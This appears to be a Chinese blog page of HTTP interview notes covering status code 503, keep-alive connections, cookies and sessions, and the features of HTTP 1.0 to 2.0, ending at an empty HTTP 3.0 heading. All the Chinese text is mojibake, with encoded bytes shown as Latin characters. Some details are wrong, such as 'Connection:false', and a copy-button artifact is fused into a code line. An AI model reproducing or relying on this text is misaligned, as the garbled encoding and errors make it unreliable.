<p>503ï¼šæœåŠ¡å™¨æš‚æ—¶å¤„äºè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼Œç°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚</p>
<h2 id="å„ç§åè®®ä¸HTTPåè®®ä¹‹é—´çš„å…³ç³»"><a href="#å„ç§åè®®ä¸HTTPåè®®ä¹‹é—´çš„å…³ç³»" class="headerlink" title="å„ç§åè®®ä¸HTTPåè®®ä¹‹é—´çš„å…³ç³»"></a>å„ç§åè®®ä¸HTTPåè®®ä¹‹é—´çš„å…³ç³»</h2><p>ä¸€èˆ¬é¢è¯•å®˜ä¼šé€šè¿‡è¿™æ ·çš„é—®é¢˜æ¥è€ƒå¯Ÿä½ å¯¹è®¡ç®—æœºç½‘ç»œçŸ¥è¯†ä½“ç³»çš„ç†è§£ã€‚</p>
<p>å›¾ç‰‡æ¥æºï¼šã€Šå›¾è§£HTTPã€‹</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848912.png" alt="å„ç§åè®®ä¸HTTPåè®®ä¹‹é—´çš„å…³ç³»"></p>
<h2 id="HTTPé•¿è¿æ¥-çŸ­è¿æ¥"><a href="#HTTPé•¿è¿æ¥-çŸ­è¿æ¥" class="headerlink" title="HTTPé•¿è¿æ¥,çŸ­è¿æ¥"></a>HTTPé•¿è¿æ¥,çŸ­è¿æ¥</h2><p>åœ¨HTTP&#x2F;1.0ä¸­é»˜è®¤ä½¿ç”¨çŸ­è¿æ¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ¯è¿›è¡Œä¸€æ¬¡HTTPæ“ä½œï¼Œå°±å»ºç«‹ä¸€æ¬¡è¿æ¥ï¼Œä»»åŠ¡ç»“æŸå°±ä¸­æ–­è¿æ¥ã€‚å½“å®¢æˆ·ç«¯æµè§ˆå™¨è®¿é—®çš„æŸä¸ªHTMLæˆ–å…¶ä»–ç±»å‹çš„Webé¡µä¸­åŒ…å«æœ‰å…¶ä»–çš„Webèµ„æºï¼ˆå¦‚JavaScriptæ–‡ä»¶ã€å›¾åƒæ–‡ä»¶ã€CSSæ–‡ä»¶ç­‰ï¼‰ï¼Œæ¯é‡åˆ°è¿™æ ·ä¸€ä¸ªWebèµ„æºï¼Œæµè§ˆå™¨å°±ä¼šé‡æ–°å»ºç«‹ä¸€ä¸ªHTTPä¼šè¯ã€‚</p>
<p>è€Œä»HTTP&#x2F;1.1èµ·ï¼Œé»˜è®¤ä½¿ç”¨é•¿è¿æ¥ï¼Œç”¨ä»¥ä¿æŒè¿æ¥ç‰¹æ€§ã€‚ä½¿ç”¨é•¿è¿æ¥çš„HTTPåè®®ï¼Œä¼šåœ¨å“åº”å¤´åŠ å…¥è¿™è¡Œä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection:keep-aliveCopy to clipboardErrorCopied</span><br></pre></td></tr></table></figure>

<p>åœ¨ä½¿ç”¨é•¿è¿æ¥çš„æƒ…å†µä¸‹ï¼Œå½“ä¸€ä¸ªç½‘é¡µæ‰“å¼€å®Œæˆåï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ç”¨äºä¼ è¾“HTTPæ•°æ®çš„TCPè¿æ¥ä¸ä¼šå…³é—­ï¼Œå®¢æˆ·ç«¯å†æ¬¡è®¿é—®è¿™ä¸ªæœåŠ¡å™¨æ—¶ï¼Œä¼šç»§ç»­ä½¿ç”¨è¿™ä¸€æ¡å·²ç»å»ºç«‹çš„è¿æ¥ã€‚Keep-Aliveä¸ä¼šæ°¸ä¹…ä¿æŒè¿æ¥ï¼Œå®ƒæœ‰ä¸€ä¸ªä¿æŒæ—¶é—´ï¼Œå¯ä»¥åœ¨ä¸åŒçš„æœåŠ¡å™¨è½¯ä»¶ï¼ˆå¦‚Apacheï¼‰ä¸­è®¾å®šè¿™ä¸ªæ—¶é—´ã€‚å®ç°é•¿è¿æ¥éœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½æ”¯æŒé•¿è¿æ¥ã€‚</p>
<p><strong>HTTPåè®®çš„é•¿è¿æ¥å’ŒçŸ­è¿æ¥ï¼Œå®è´¨ä¸Šæ˜¯TCPåè®®çš„é•¿è¿æ¥å’ŒçŸ­è¿æ¥ã€‚</strong></p>
<p>â€”â€” <a href="https://www.cnblogs.com/gotodsp/p/6366163.html">ã€ŠHTTPé•¿è¿æ¥ã€çŸ­è¿æ¥ç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Ÿã€‹</a></p>
<h2 id="HTTPæ˜¯ä¸ä¿å­˜çŠ¶æ€çš„åè®®-å¦‚ä½•ä¿å­˜ç”¨æˆ·çŠ¶æ€"><a href="#HTTPæ˜¯ä¸ä¿å­˜çŠ¶æ€çš„åè®®-å¦‚ä½•ä¿å­˜ç”¨æˆ·çŠ¶æ€" class="headerlink" title="HTTPæ˜¯ä¸ä¿å­˜çŠ¶æ€çš„åè®®,å¦‚ä½•ä¿å­˜ç”¨æˆ·çŠ¶æ€?"></a>HTTPæ˜¯ä¸ä¿å­˜çŠ¶æ€çš„åè®®,å¦‚ä½•ä¿å­˜ç”¨æˆ·çŠ¶æ€?</h2><p>HTTP æ˜¯ä¸€ç§ä¸ä¿å­˜çŠ¶æ€ï¼Œå³æ— çŠ¶æ€ï¼ˆstatelessï¼‰åè®®ã€‚ä¹Ÿå°±æ˜¯è¯´ HTTP åè®®è‡ªèº«ä¸å¯¹è¯·æ±‚å’Œå“åº”ä¹‹é—´çš„é€šä¿¡çŠ¶æ€è¿›è¡Œä¿å­˜ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¿å­˜ç”¨æˆ·çŠ¶æ€å‘¢ï¼ŸSession æœºåˆ¶çš„å­˜åœ¨å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒSession çš„ä¸»è¦ä½œç”¨å°±æ˜¯é€šè¿‡æœåŠ¡ç«¯è®°å½•ç”¨æˆ·çš„çŠ¶æ€ã€‚å…¸å‹çš„åœºæ™¯æ˜¯è´­ç‰©è½¦ï¼Œå½“ä½ è¦æ·»åŠ å•†å“åˆ°è´­ç‰©è½¦çš„æ—¶å€™ï¼Œç³»ç»Ÿä¸çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·æ“ä½œçš„ï¼Œå› ä¸º HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ã€‚æœåŠ¡ç«¯ç»™ç‰¹å®šçš„ç”¨æˆ·åˆ›å»ºç‰¹å®šçš„ Session ä¹‹åå°±å¯ä»¥æ ‡è¯†è¿™ä¸ªç”¨æˆ·å¹¶ä¸”è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·äº†ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜è¿™ä¸ª Sessionï¼Œè¿‡äº†æ—¶é—´é™åˆ¶ï¼Œå°±ä¼šé”€æ¯è¿™ä¸ªSessionï¼‰ã€‚</p>
<p>åœ¨æœåŠ¡ç«¯ä¿å­˜ Session çš„æ–¹æ³•å¾ˆå¤šï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯å†…å­˜å’Œæ•°æ®åº“(æ¯”å¦‚æ˜¯ä½¿ç”¨å†…å­˜æ•°æ®åº“redisä¿å­˜)ã€‚æ—¢ç„¶ Session å­˜æ”¾åœ¨æœåŠ¡å™¨ç«¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å®ç° Session è·Ÿè¸ªå‘¢ï¼Ÿå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½æ˜¯é€šè¿‡åœ¨ Cookie ä¸­é™„åŠ ä¸€ä¸ª Session ID æ¥æ–¹å¼æ¥è·Ÿè¸ªã€‚</p>
<p><strong>Cookie è¢«ç¦ç”¨æ€ä¹ˆåŠ?</strong></p>
<p>æœ€å¸¸ç”¨çš„å°±æ˜¯åˆ©ç”¨ URL é‡å†™æŠŠ Session ID ç›´æ¥é™„åŠ åœ¨URLè·¯å¾„çš„åé¢ã€‚</p>
<h2 id="Cookieçš„ä½œç”¨æ˜¯ä»€ä¹ˆ-å’ŒSessionæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#Cookieçš„ä½œç”¨æ˜¯ä»€ä¹ˆ-å’ŒSessionæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="Cookieçš„ä½œç”¨æ˜¯ä»€ä¹ˆ?å’ŒSessionæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>Cookieçš„ä½œç”¨æ˜¯ä»€ä¹ˆ?å’ŒSessionæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>Cookie å’Œ Sessionéƒ½æ˜¯ç”¨æ¥è·Ÿè¸ªæµè§ˆå™¨ç”¨æˆ·èº«ä»½çš„ä¼šè¯æ–¹å¼ï¼Œä½†æ˜¯ä¸¤è€…çš„åº”ç”¨åœºæ™¯ä¸å¤ªä¸€æ ·ã€‚</p>
<p><strong>Cookie ä¸€èˆ¬ç”¨æ¥ä¿å­˜ç”¨æˆ·ä¿¡æ¯</strong> æ¯”å¦‚â‘ æˆ‘ä»¬åœ¨ Cookie ä¸­ä¿å­˜å·²ç»ç™»å½•è¿‡å¾—ç”¨æˆ·ä¿¡æ¯ï¼Œä¸‹æ¬¡è®¿é—®ç½‘ç«™çš„æ—¶å€™é¡µé¢å¯ä»¥è‡ªåŠ¨å¸®ä½ ç™»å½•çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ç»™å¡«äº†ï¼›â‘¡ä¸€èˆ¬çš„ç½‘ç«™éƒ½ä¼šæœ‰ä¿æŒç™»å½•ä¹Ÿå°±æ˜¯è¯´ä¸‹æ¬¡ä½ å†è®¿é—®ç½‘ç«™çš„æ—¶å€™å°±ä¸éœ€è¦é‡æ–°ç™»å½•äº†ï¼Œè¿™æ˜¯å› ä¸ºç”¨æˆ·ç™»å½•çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å­˜æ”¾äº†ä¸€ä¸ª Token åœ¨ Cookie ä¸­ï¼Œä¸‹æ¬¡ç™»å½•çš„æ—¶å€™åªéœ€è¦æ ¹æ® Token å€¼æ¥æŸ¥æ‰¾ç”¨æˆ·å³å¯(ä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œé‡æ–°ç™»å½•ä¸€èˆ¬è¦å°† Token é‡å†™)ï¼›â‘¢ç™»å½•ä¸€æ¬¡ç½‘ç«™åè®¿é—®ç½‘ç«™å…¶ä»–é¡µé¢ä¸éœ€è¦é‡æ–°ç™»å½•ã€‚<strong>Session çš„ä¸»è¦ä½œç”¨å°±æ˜¯é€šè¿‡æœåŠ¡ç«¯è®°å½•ç”¨æˆ·çš„çŠ¶æ€ã€‚</strong> å…¸å‹çš„åœºæ™¯æ˜¯è´­ç‰©è½¦ï¼Œå½“ä½ è¦æ·»åŠ å•†å“åˆ°è´­ç‰©è½¦çš„æ—¶å€™ï¼Œç³»ç»Ÿä¸çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·æ“ä½œçš„ï¼Œå› ä¸º HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ã€‚æœåŠ¡ç«¯ç»™ç‰¹å®šçš„ç”¨æˆ·åˆ›å»ºç‰¹å®šçš„ Session ä¹‹åå°±å¯ä»¥æ ‡è¯†è¿™ä¸ªç”¨æˆ·å¹¶ä¸”è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·äº†ã€‚</p>
<p>Cookie æ•°æ®ä¿å­˜åœ¨å®¢æˆ·ç«¯(æµè§ˆå™¨ç«¯)ï¼ŒSession æ•°æ®ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚</p>
<p>Cookie å­˜å‚¨åœ¨å®¢æˆ·ç«¯ä¸­ï¼Œè€ŒSessionå­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œç›¸å¯¹æ¥è¯´ Session å®‰å…¨æ€§æ›´é«˜ã€‚å¦‚æœè¦åœ¨ Cookie ä¸­å­˜å‚¨ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œä¸è¦ç›´æ¥å†™å…¥ Cookie ä¸­ï¼Œæœ€å¥½èƒ½å°† Cookie ä¿¡æ¯åŠ å¯†ç„¶åä½¿ç”¨åˆ°çš„æ—¶å€™å†å»æœåŠ¡å™¨ç«¯è§£å¯†ã€‚</p>
<h2 id="HTTPå’ŒTCPçš„åŒºåˆ«"><a href="#HTTPå’ŒTCPçš„åŒºåˆ«" class="headerlink" title="HTTPå’ŒTCPçš„åŒºåˆ«"></a>HTTPå’ŒTCPçš„åŒºåˆ«</h2><p>httpåè®®æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œæ˜¯åº”ç”¨å±‚åè®®ï¼Œhttpåè®®æ˜¯å»ºç«‹åœ¨tcpåè®®ä¹‹ä¸Šçš„ã€‚httpåè®®çš„ç‰¹ç‚¹æ˜¯å®¢æˆ·ç«¯å‘é€è¯·æ±‚éƒ½éœ€è¦æœåŠ¡ç«¯å›åº”ï¼Œåœ¨è¯·æ±‚ç»“æŸåï¼Œä¼šä¸»åŠ¨é‡Šæ”¾é“¾æ¥ã€‚ä»å»ºç«‹è¿æ¥åˆ°å…³é—­è¿æ¥çš„è¿‡ç¨‹ç§°ä¸ºâ€˜ä¸€æ¬¡è¿æ¥â€™ã€‚</p>
<h2 id="HTTP-1-0-1-1-2-0-3-0-çš„ç‰¹ç‚¹åŠå…¶åŒºåˆ«"><a href="#HTTP-1-0-1-1-2-0-3-0-çš„ç‰¹ç‚¹åŠå…¶åŒºåˆ«" class="headerlink" title="HTTP 1.0 1.1 2.0 3.0 çš„ç‰¹ç‚¹åŠå…¶åŒºåˆ«"></a>HTTP 1.0 1.1 2.0 3.0 çš„ç‰¹ç‚¹åŠå…¶åŒºåˆ«</h2><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP 1.0"></a>HTTP 1.0</h3><p>HTTP1.0æœ€æ—©åœ¨ç½‘é¡µä¸­ä½¿ç”¨æ˜¯åœ¨1996å¹´ï¼Œé‚£ä¸ªæ—¶å€™åªæ˜¯ä½¿ç”¨ä¸€äº›è¾ƒä¸ºç®€å•çš„ç½‘é¡µä¸Šå’Œç½‘ç»œè¯·æ±‚ä¸Š</p>
<p>1.0çš„HTTPç‰ˆæœ¬ï¼Œæ˜¯ä¸€ç§æ— çŠ¶æ€ï¼Œæ— è¿æ¥çš„åº”ç”¨å±‚åè®®ã€‚ HTTP1.0è§„å®šæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¿æŒçŸ­æš‚çš„é“¾æ¥ã€‚</p>
<p>æµè§ˆå™¨æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦ä¸æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªTCPè¿æ¥ï¼ŒæœåŠ¡å™¨å¤„ç†å®Œæˆä»¥åç«‹å³æ–­å¼€TCPè¿æ¥(æ— è¿æ¥)ï¼ŒæœåŠ¡å™¨ä¸è·Ÿè¸ªä¹Ÿæ¯ä¸ªå®¢æˆ·å•ï¼Œä¹Ÿä¸è®°å½•è¿‡å»çš„è¯·æ±‚(æ— çŠ¶æ€)ã€‚</p>
<p>è¿™ç§æ— çŠ¶æ€æ€§å¯ä»¥å€ŸåŠ©cookie&#x2F;sessionæœºåˆ¶æ¥åšèº«ä»½è®¤è¯å’ŒçŠ¶æ€è®°å½•ã€‚</p>
<h4 id="HTTP1-0å­˜åœ¨çš„é—®é¢˜"><a href="#HTTP1-0å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="HTTP1.0å­˜åœ¨çš„é—®é¢˜"></a>HTTP1.0å­˜åœ¨çš„é—®é¢˜</h4><h5 id="æ— æ³•å¤ç”¨è¿æ¥"><a href="#æ— æ³•å¤ç”¨è¿æ¥" class="headerlink" title="æ— æ³•å¤ç”¨è¿æ¥"></a>æ— æ³•å¤ç”¨è¿æ¥</h5><p>æ¯æ¬¡å‘é€è¯·æ±‚ï¼Œéƒ½éœ€è¦è¿›è¡Œä¸€æ¬¡TCPè¿æ¥ï¼Œè€ŒTCPçš„è¿æ¥é‡Šæ”¾è¿‡ç¨‹åˆæ˜¯æ¯”è¾ƒè´¹äº‹çš„ã€‚è¿™ç§æ— è¿æ¥çš„ç‰¹æ€§ä¼šä½¿å¾—ç½‘ç»œçš„åˆ©ç”¨ç‡å˜ä½ã€‚</p>
<h5 id="é˜Ÿå¤´é˜»å¡-head-of-line-blocking"><a href="#é˜Ÿå¤´é˜»å¡-head-of-line-blocking" class="headerlink" title="é˜Ÿå¤´é˜»å¡(head of line blocking)"></a>é˜Ÿå¤´é˜»å¡(head of line blocking)</h5><p>ç”±äºHTTP1.0è§„å®šä¸‹ä¸€ä¸ªè¯·æ±‚å¿…é¡»åœ¨å‰ä¸€ä¸ªè¯·æ±‚å“åº”åˆ°è¾¾ä¹‹å‰æ‰èƒ½å‘é€ï¼Œå‡è®¾å‰ä¸€ä¸ªè¯·æ±‚å“åº”ä¸€ç›´ä¸åˆ°è¾¾ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªè¯·æ±‚å°±ä¸å‘é€ï¼Œåé¢çš„è¯·æ±‚å°±é˜»å¡äº†ã€‚</p>
<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP 1.1"></a>HTTP 1.1</h3><p>HTTP1.1åœ¨1999å¹´æ‰å¼€å§‹å¹¿æ³›åº”ç”¨äºç°åœ¨çš„å„å¤§æµè§ˆå™¨ç½‘ç»œè¯·æ±‚ä¸­ï¼ŒåŒæ—¶HTTP1.1ä¹Ÿæ˜¯å½“å‰ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„HTTPåè®®ã€‚</p>
<p>HTTP1.1ç»§æ‰¿äº†HTTP1.0çš„ç®€å•ï¼Œå…‹æœäº†HTTP1.0æ€§èƒ½ä¸Šçš„é—®é¢˜ã€‚</p>
<p><strong>é•¿è¿æ¥</strong></p>
<p>HTTP1.1å¢åŠ Connectionå­—æ®µï¼Œé€šè¿‡è®¾ç½®Keep-Aliveä¿æŒHTTPè¿æ¥ä¸æ–­å¡ã€‚é¿å…æ¯æ¬¡å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¯·æ±‚éƒ½è¦é‡å¤å»ºç«‹é‡Šæ”¾å»ºç«‹TCPè¿æ¥ã€‚æé«˜äº†ç½‘ç»œçš„åˆ©ç”¨ç‡ã€‚</p>
<p>å¦‚æœå®¢æˆ·ç«¯æƒ³å…³é—­HTTPè¿æ¥ï¼Œå¯ä»¥åœ¨è¯·æ±‚å¤´ä¸­æºå¸¦Connection:falseæ¥å‘ŠçŸ¥æœåŠ¡å™¨å…³é—­è¯·æ±‚ã€‚</p>
<p><strong>ç®¡é“åŒ–(pipelining)â€” å°´å°¬çš„å‡å¹¶è¡Œä¼ è¾“</strong></p>
<p>HTTP1.1æ”¯æŒè¯·æ±‚ç®¡é“åŒ–(pipelining)ã€‚</p>
<p>åŸºäºHTTP1.1çš„é•¿è¿æ¥ï¼Œä½¿å¾—è¯·æ±‚ç®¡çº¿åŒ–æˆä¸ºå¯èƒ½ã€‚ ç®¡çº¿åŒ–ä½¿å¾—è¯·æ±‚èƒ½å¤Ÿâ€œå¹¶è¡Œâ€ä¼ è¾“ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>å‡å¦‚å“åº”çš„ä¸»ä½“æ˜¯ä¸€ä¸ªhtmlé¡µé¢ï¼Œé¡µé¢ä¸­åŒ…å«äº†å¾ˆå¤šimgï¼Œè¿™ä¸ªæ—¶å€™keep-aliveå°±äº†å¾ˆå¤§ä½œç”¨ã€‚èƒ½å¤Ÿâ€œå¹¶è¡Œâ€å‘é€å¤šä¸ªè¯·æ±‚ã€‚(æ³¨æ„ï¼Œè¿™é‡Œçš„â€œå¹¶è¡Œâ€å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„å¹¶è¡Œä¼ è¾“)</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæœåŠ¡å™¨å¿…é¡»æŒ‰ç…§å®¢æˆ·ç«¯è¯·æ±‚çš„å…ˆåé¡ºåºä¾æ¬¡å›é€ç›¸åº”çš„ç»“æœï¼Œä»¥ä¿è¯å®¢æˆ·ç«¯èƒ½å¤ŸåŒºåˆ†å‡ºæ¯æ¬¡è¯·æ±‚çš„å“åº”å†…å®¹ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒHTTPç®¡é“åŒ–å¯ä»¥è®©æˆ‘ä»¬æŠŠå…ˆè¿›å…ˆå‡ºé˜Ÿåˆ—ä»å®¢æˆ·ç«¯(è¯·æ±‚é˜Ÿåˆ—)è¿ç§»åˆ°æœåŠ¡ç«¯(å“åº”é˜Ÿåˆ—)</p>
<p><strong>å¦‚æœï¼Œå®¢æˆ·ç«¯åŒæ—¶å‘äº†ä¸¤ä¸ªè¯·æ±‚åˆ†åˆ«è·å–htmlå’Œcssï¼Œå‡å¦‚è¯´æœåŠ¡å™¨çš„cssèµ„æºå…ˆå‡†å¤‡å°±ç»ªï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šå…ˆå‘é€htmlï¼Œå†å‘é€cssã€‚ æ¢å¥è¯æ¥è¯´ï¼Œåªæœ‰ç­‰åˆ°htmlå“åº”çš„èµ„æºå®Œå…¨ä¼ è¾“å®Œæ¯•åï¼Œcsså“åº”çš„èµ„æºæ‰å¼€å§‹ä¼ è¾“ï¼Œä¸å…è®¸åŒæ—¶å­˜åœ¨ä¸¤ä¸ªå¹¶è¡Œçš„å“åº”ã€‚</strong></p>
<p>å¯è§ï¼ŒHTTP1.1è¿˜æ˜¯æ— æ³•è§£å†³é˜Ÿå¤´é˜»å¡(head of line blocking)çš„é—®é¢˜ã€‚åŒæ—¶â€œç®¡é“åŒ–â€æŠ€æœ¯å­˜åœ¨å„ç§å„æ ·çš„é—®é¢˜ï¼Œæ‰€ä»¥å¾ˆå¤šæµè§ˆå™¨è¦ä¹ˆæ ¹æœ¬ä¸æ”¯æŒå®ƒï¼Œè¦ä¹ˆç›´æ¥é»˜è®¤å…³é—­ï¼Œå¹¶ä¸”å¼€å¯çš„æ¡ä»¶å¾ˆè‹›åˆ»â€¦â€¦è€Œä¸”å¥½åƒå®é™…ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç”¨å¤„ã€‚</p>
<p><strong>çœŸå¹¶è¡Œä¼ è¾“ â€” æµè§ˆå™¨ä¼˜åŒ–ç­–ç•¥</strong></p>
<p>HTTP1.1æ”¯æŒç®¡é“åŒ–ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¹Ÿå¿…é¡»è¿›è¡Œé€ä¸ªå“åº”çš„é€å›ï¼Œè¿™ä¸ªæ˜¯å¾ˆå¤§çš„ä¸€ä¸ªç¼ºé™·ã€‚å®é™…ä¸Šï¼Œç°é˜¶æ®µçš„æµè§ˆå™¨å‚å•†é‡‡å–äº†å¦å¤–ä¸€ç§åšæ³•ï¼Œå®ƒå…è®¸æˆ‘ä»¬æ‰“å¼€å¤šä¸ªTCPçš„ä¼šè¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šå›¾æˆ‘ä»¬çœ‹åˆ°çš„å¹¶è¡Œï¼Œå…¶å®æ˜¯ä¸åŒçš„TCPè¿æ¥ä¸Šçš„HTTPè¯·æ±‚å’Œç›¸åº”ã€‚è¿™æ‰æ˜¯çœŸæ­£çš„å¹¶è¡Œ!</p>
<p><strong>ç¼“å­˜å¤„ç† â€” å¼ºç¼“å­˜ã€åå•†ç¼“å­˜ï¼Œå¯å‘å¼ç¼“å­˜(æ–°å¢)</strong></p>
<p>æ­¤å¤–ï¼ŒHTTP1.1è¿˜åŠ å…¥äº†ç¼“å­˜å¤„ç†(å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜)ï¼Œæ–°çš„å­—æ®µå¦‚cache-controlï¼Œæ”¯æŒæ–­ç‚¹ä¼ è¾“ï¼Œä»¥åŠå¢åŠ äº†Hostå­—æ®µ(ä½¿å¾—ä¸€ä¸ªæœåŠ¡å™¨èƒ½å¤Ÿç”¨æ¥åˆ›å»ºå¤šä¸ªWebç«™ç‚¹)</p>
<h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP 2.0"></a>HTTP 2.0</h3><p><strong>äºŒè¿›åˆ¶åˆ†å¸§</strong></p>
<p>HTTP2.0é€šè¿‡åœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¹‹é—´å¢åŠ ä¸€ä¸ªäºŒè¿›åˆ¶åˆ†å±‚å¸§ï¼Œçªç ´äº†HTTP1.1çš„æ€§èƒ½é™åˆ¶ï¼Œæ”¹è¿›ä¼ è¾“æ€§èƒ½ã€‚</p>
<p><strong>å¤šè·¯å¤ç”¨(é“¾æ¥å…±äº«)â€” çœŸå¹¶è¡Œä¼ è¾“</strong></p>
<ul>
<li>æµ(stream)ï¼šå·²å»ºç«‹è¿æ¥ä¸Šçš„åŒå‘å­—èŠ‚æµã€‚</li>
<li>æ¶ˆæ¯ï¼šä¸é€»è¾‘æ¶ˆæ¯å¯¹åº”çš„å®Œæ•´çš„ä¸€ç³»åˆ—æ•°æ®å¸§ã€‚</li>
<li>å¸§(frame)ï¼šHTTP2.0é€šä¿¡çš„æœ€å°å•ä½ï¼Œæ¯ä¸ªå¸§åŒ…å«å¤´éƒ¨ï¼Œè‡³å°‘ä¹Ÿä¼šæ ‡è¯†å‡ºå½“å‰æ‰€å±çš„æµ(stream_id)</li>
</ul>
<p>æ‰€æœ‰HTTP2.0é€šä¿¡éƒ½åœ¨ä¸€ä¸ªTCPé“¾æ¥ä¸Šå®Œæˆï¼Œè¿™ä¸ªé“¾æ¥å¯ä»¥æ‰¿è½½ä»»æ„æµé‡çš„åŒå‘æ•°æ®æµã€‚</p>
<p>æ¯ä¸ªæ•°æ®æµä»¥æ¶ˆæ¯çš„å½¢å¼å‘é€ï¼Œè€Œæ¶ˆæ¯ç”±ä¸€æˆ–å¤šä¸ªå¸§ç»„æˆã€‚è¿™äº›å¸§å¯ä»¥ä¹±åºå‘é€ï¼Œç„¶åå†æ ¹æ®æ¯ä¸ªå¸§å¤´éƒ¨çš„æµæ ‡è¯†ç¬¦(Stream_id)é‡æ–°å°è£…ã€‚</p>
<p>å¤šè·¯å¤ç”¨(è¿æ¥å…±äº«)å¯èƒ½ä¼šå¯¼è‡´å…³é”®å­—è¢«é˜»å¡ï¼ŒHTTP2.0é‡Œæ¯ä¸ªæ•°æ®æµéƒ½å¯ä»¥è®¾ç½®ä¼˜å…ˆçº§å’Œä¾èµ–ï¼Œä¼˜å…ˆçº§é«˜çš„æ•°æ®æµä¼šè¢«æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†å’Œè¿”å›å®¢æˆ·ç«¯ï¼Œæ•°æ®æµè¿˜å¯ä»¥ä¾èµ–å…¶ä»–çš„å­æ•°æ®æµã€‚</p>
<p>å¯è§ï¼ŒHTTP2.0å®ç°äº†çœŸæ­£çš„å¹¶è¡Œä¼ è¾“ï¼Œå®ƒèƒ½å¤Ÿåœ¨ä¸€ä¸ªTCPä¸Šè¿›è¡Œä»»æ„æ•°é‡çš„HTTPè¯·æ±‚ã€‚è€Œè¿™ä¸ªå¼ºå¤§çš„åŠŸèƒ½åŸºäºâ€œäºŒçº§åˆ¶åˆ†å¸§â€çš„ç‰¹æ€§ã€‚</p>
<p><strong>å¤´éƒ¨å‹ç¼©</strong></p>
<p>åœ¨HTTP1.Xä¸­ï¼Œå¤´éƒ¨å…ƒæ•°æ®éƒ½æ˜¯ä»¥çº¯æ–‡æœ¬çš„å½¢å¼å‘é€çš„ï¼Œé€šå¸¸ä¼šç»™æ¯ä¸ªè¯·æ±‚å¢åŠ 500-8000å­—èŠ‚çš„è´Ÿè·ã€‚</p>
<p>æ¯”å¦‚cookieï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šåœ¨æ¯æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼ŒæŠŠcookieé™„åœ¨headerä¸Šé¢å‘ç»™æœåŠ¡å™¨ã€‚</p>
<p>HTTP2.0ä½¿ç”¨encoderæ¥å‡å°‘éœ€è¦ä¼ è¾“çš„headerå¤§å°ï¼Œé€šè®¯åŒæ–¹å„è‡ªcacheä¸€ä»½header_filesè¡¨ï¼Œæ—¢é¿å…é‡å¤headerçš„ä¼ è¾“ï¼Œåˆå‡å°‘äº†éœ€è¦ä¼ è¾“çš„å¤§å°ã€‚</p>
<p>é«˜æ•ˆçš„å‹ç¼©ç®—æ³•å¯ä»¥å¾ˆå¤§çš„å‹ç¼©headerï¼Œå‡å°‘å‘é€åŒ…çš„æ•°é‡ä»è€Œé™ä½å»¶è¿Ÿã€‚</p>
<p><strong>æœåŠ¡å™¨æ¨é€</strong></p>
<p>æœåŠ¡å™¨é™¤äº†æœ€åˆè¯·æ±‚çš„å“åº”å¤–ï¼ŒæœåŠ¡å™¨è¿˜å¯ä»¥é¢å¤–å‘å®¢æˆ·ç«¯æ¨é€èµ„æºï¼Œè€Œæ— éœ€å®¢æˆ·ç«¯æ˜ç¡®çš„éœ€æ±‚ã€‚</p>
<p><strong>HTTP3.0</strong></p>
